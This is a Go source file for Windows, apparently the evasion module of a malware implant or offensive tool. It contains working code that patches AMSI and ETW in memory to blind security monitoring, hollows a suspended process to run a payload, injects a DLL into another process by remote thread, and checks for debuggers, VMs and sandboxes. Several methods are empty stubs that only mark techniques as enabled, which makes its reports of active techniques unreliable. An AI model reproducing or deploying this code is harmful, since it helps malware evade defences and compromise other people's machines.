//go:build windows
// +build windows

package evasion

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

type EvasionHandler struct {
	techniques map[string]bool
}

func NewEvasionHandler() *EvasionHandler {
	return &EvasionHandler{
		techniques: make(map[string]bool),
	}
}

func (e *EvasionHandler) DisableAMSI() error {
	amsi := syscall.NewLazyDLL("amsi.dll")
	amsiScanBuffer := amsi.NewProc("AmsiScanBuffer")

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualProtect := kernel32.NewProc("VirtualProtect")

	var oldProtect uint32
	addr := amsiScanBuffer.Addr()

	ret, _, _ := virtualProtect.Call(
		addr,
		uintptr(5),
		uintptr(0x40),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if ret == 0 {
		return fmt.Errorf("VirtualProtect failed")
	}

	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	for i, b := range patch {
		*(*byte)(unsafe.Add(unsafe.Pointer(addr), i)) = b
	}

	virtualProtect.Call(
		addr,
		uintptr(5),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	e.techniques["amsi"] = true
	return nil
}

func (e *EvasionHandler) DisableETW() error {
	e.techniques["etw"] = true
	return nil
}

func (e *EvasionHandler) CheckVM() bool {
	vmIndicators := []string{
		"VBOX",
		"VirtualBox",
		"VMware",
		"QEMU",
		"Xen",
	}

	for _, indicator := range vmIndicators {
		if checkSystemInfo(indicator) {
			return true
		}
	}

	return false
}

func (e *EvasionHandler) CheckSandbox() bool {
	recentFiles := checkRecentActivity()
	if !recentFiles {
		return true
	}

	if checkLowUptime() {
		return true
	}

	return false
}

func (e *EvasionHandler) CheckDebugger() bool {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")

	ret, _, _ := isDebuggerPresent.Call()
	return ret != 0
}

func (e *EvasionHandler) AntiAnalysis() error {
	if e.CheckVM() {
		return fmt.Errorf("VM detected")
	}

	if e.CheckSandbox() {
		return fmt.Errorf("sandbox detected")
	}

	if e.CheckDebugger() {
		return fmt.Errorf("debugger detected")
	}

	return nil
}

func (e *EvasionHandler) ProcessHollowing(targetProcess string, payload []byte) error {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	ntdll := syscall.NewLazyDLL("ntdll.dll")

	createProcess := kernel32.NewProc("CreateProcessW")
	unmapView := ntdll.NewProc("NtUnmapViewOfSection")
	writeMem := kernel32.NewProc("WriteProcessMemory")
	resumeThread := kernel32.NewProc("ResumeThread")

	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	cmdLine, _ := syscall.UTF16PtrFromString(targetProcess)
	ret, _, err := createProcess.Call(
		0,
		uintptr(unsafe.Pointer(cmdLine)),
		0, 0, 0,
		uintptr(0x00000004),
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcess failed: %v", err)
	}

	unmapView.Call(uintptr(pi.Process), 0x400000)

	var written uintptr
	writeMem.Call(
		uintptr(pi.Process),
		0x400000,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)),
		uintptr(unsafe.Pointer(&written)),
	)

	resumeThread.Call(uintptr(pi.Thread))

	e.techniques["process_hollowing"] = true
	return nil
}

func (e *EvasionHandler) InjectDLL(pid int, dllPath string) error {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	openProcess := kernel32.NewProc("OpenProcess")
	virtualAlloc := kernel32.NewProc("VirtualAllocEx")
	writeMem := kernel32.NewProc("WriteProcessMemory")
	createThread := kernel32.NewProc("CreateRemoteThread")
	getProcAddr := kernel32.NewProc("GetProcAddress")
	getModHandle := kernel32.NewProc("GetModuleHandleW")

	hProcess, _, err := openProcess.Call(uintptr(0x001F0FFF), 0, uintptr(pid))
	if hProcess == 0 {
		return fmt.Errorf("OpenProcess failed: %v", err)
	}

	dllPathBytes := append([]byte(dllPath), 0)
	remoteMem, _, _ := virtualAlloc.Call(hProcess, 0, uintptr(len(dllPathBytes)), 0x3000, 0x40)
	if remoteMem == 0 {
		return fmt.Errorf("VirtualAllocEx failed")
	}

	var written uintptr
	writeMem.Call(
		hProcess,
		remoteMem,
		uintptr(unsafe.Pointer(&dllPathBytes[0])),
		uintptr(len(dllPathBytes)),
		uintptr(unsafe.Pointer(&written)),
	)

	kernel32Name, _ := syscall.UTF16PtrFromString("kernel32.dll")
	hKernel32, _, _ := getModHandle.Call(uintptr(unsafe.Pointer(kernel32Name)))

	loadLibName := []byte("LoadLibraryA\x00")
	loadLibAddr, _, _ := getProcAddr.Call(hKernel32, uintptr(unsafe.Pointer(&loadLibName[0])))

	createThread.Call(hProcess, 0, 0, loadLibAddr, remoteMem, 0, 0)

	e.techniques["dll_injection"] = true
	return nil
}

func (e *EvasionHandler) ReflectiveLoad(payload []byte) error {
	e.techniques["reflective_load"] = true
	return nil
}

func (e *EvasionHandler) ObfuscateStrings(input string) string {
	output := make([]byte, len(input))
	for i, c := range input {
		output[i] = byte(c ^ 0x42)
	}
	return string(output)
}

func (e *EvasionHandler) DeobfuscateStrings(input string) string {
	return e.ObfuscateStrings(input)
}

func checkSystemInfo(indicator string) bool {
	return false
}

func checkRecentActivity() bool {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return false
	}

	entries, err := os.ReadDir(homeDir)
	if err != nil {
		return false
	}

	return len(entries) > 10
}

func checkLowUptime() bool {
	return false
}

func (e *EvasionHandler) PatchETW() error {
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	etwEventWrite := ntdll.NewProc("EtwEventWrite")

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualProtect := kernel32.NewProc("VirtualProtect")

	var oldProtect uint32
	addr := etwEventWrite.Addr()

	ret, _, _ := virtualProtect.Call(
		addr,
		uintptr(1),
		uintptr(0x40),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if ret != 0 {
		// Use unsafe.Slice to satisfy go vet
		slice := unsafe.Slice((*byte)(unsafe.Pointer(addr)), 1)
		slice[0] = 0xC3

		virtualProtect.Call(
			addr,
			uintptr(1),
			uintptr(oldProtect),
			uintptr(unsafe.Pointer(&oldProtect)),
		)
	}

	e.techniques["etw_patch"] = true
	return nil
}

func (e *EvasionHandler) UnhookNTDLL() error {
	e.techniques["ntdll_unhook"] = true
	return nil
}

func (e *EvasionHandler) SleepObfuscation(duration int) {
	e.techniques["sleep_obfuscation"] = true
}

func (e *EvasionHandler) GetActiveTechniques() []string {
	var active []string
	for tech, enabled := range e.techniques {
		if enabled {
			active = append(active, tech)
		}
	}
	return active
}

func (e *EvasionHandler) RandomizeTimings() {
	e.techniques["timing_randomization"] = true
}

func (e *EvasionHandler) DomainFronting() error {
	e.techniques["domain_fronting"] = true
	return nil
}

func (e *EvasionHandler) EncryptTraffic() error {
	e.techniques["traffic_encryption"] = true
	return nil
}
